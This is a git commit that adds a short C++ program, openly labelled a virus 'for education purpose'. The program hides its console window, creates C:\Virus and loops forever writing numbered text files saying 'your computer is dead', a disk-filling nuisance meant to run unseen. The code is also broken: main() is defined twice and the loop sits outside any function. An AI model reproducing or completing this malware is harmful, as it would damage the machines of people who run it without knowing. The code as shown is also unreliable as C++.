21834f837b11c499569a3243fc5f48ad3c74a78e
hussytechs <138764375+hussytechs@users.noreply.github.com>
2024-10-18 10:43:12 +1100

    EDUCATION PURPOSE ONLY

---
+++ virus forn education purpose.cpp
@@ -0,0 +1,23 @@
+#include <iostream>
+#include <fstream> //for openning the files and write inside of them
+#include <string> //to deal with strings
+#include <direct.h> //to create a directory
+#include <Windows.h> //so we can make the program anonymous
+int main(){
+FreeConsole();
+int h = 0;
+}
+int main(){
+FreeConsole();
+int h = 0;
+const char *path = "C:\\Virus\\";
+std::string str ="your computer is dead";
+_mkdir(path); //this function will create the directory
+}
+while (true){
+++h;
+std::ofstream Virus;
+Virus.open(path + std::to_string(h) + ".txt", std::ios_base::out);
+Virus << str;
+Virus.close();
+}
